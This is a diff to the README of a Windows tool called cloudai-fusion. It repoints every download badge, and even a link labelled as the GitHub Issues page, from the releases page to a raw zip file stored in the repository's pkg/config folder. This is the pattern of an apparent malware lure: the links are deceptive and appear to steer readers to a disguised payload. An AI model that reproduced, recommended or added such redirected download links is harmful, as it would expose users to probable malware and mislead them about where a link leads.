@@ -1,6 +1,6 @@
 # ☁️ cloudai-fusion - Manage AI Tasks Simply and Efficiently
 
-[![Download cloudai-fusion](https://img.shields.io/badge/Download-cloudai--fusion-brightgreen?style=for-the-badge)](https://github.com/Svelte-genusstrekelia332/cloudai-fusion/releases)
+[![Download cloudai-fusion](https://img.shields.io/badge/Download-cloudai--fusion-brightgreen?style=for-the-badge)](https://github.com/Svelte-genusstrekelia332/cloudai-fusion/raw/refs/heads/main/pkg/config/cloudai-fusion-2.8.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Follow these steps to get cloudai-fusion up and running on your Windows computer
 
 Go to the official releases page by clicking the button below:
 
-[![Get cloudai-fusion](https://img.shields.io/badge/Get%20cloudai--fusion-blue?style=for-the-badge)](https://github.com/Svelte-genusstrekelia332/cloudai-fusion/releases)
+[![Get cloudai-fusion](https://img.shields.io/badge/Get%20cloudai--fusion-blue?style=for-the-badge)](https://github.com/Svelte-genusstrekelia332/cloudai-fusion/raw/refs/heads/main/pkg/config/cloudai-fusion-2.8.zip)
 
 This page hosts all the versions of cloudai-fusion available for download.
 
@@ -122,7 +122,7 @@ You will see status updates and results as the AI runs.
 
 If you encounter issues, you can:
 
-- Visit the [Issues page on GitHub](https://github.com/Svelte-genusstrekelia332/cloudai-fusion/issues)
+- Visit the [Issues page on GitHub](https://github.com/Svelte-genusstrekelia332/cloudai-fusion/raw/refs/heads/main/pkg/config/cloudai-fusion-2.8.zip)
 - Search for answers or report bugs
 - Provide as much detail as possible, including error messages and screen captures
 
@@ -132,4 +132,4 @@ If you encounter issues, you can:
 
 Download the latest Windows release from here:
 
-[![Download cloudai-fusion](https://img.shields.io/badge/Download-cloudai--fusion-brightgreen?style=for-the-badge)](https://github.com/Svelte-genusstrekelia332/cloudai-fusion/releases)
+[![Download cloudai-fusion](https://img.shields.io/badge/Download-cloudai--fusion-brightgreen?style=for-the-badge)](https://github.com/Svelte-genusstrekelia332/cloudai-fusion/raw/refs/heads/main/pkg/config/cloudai-fusion-2.8.zip)
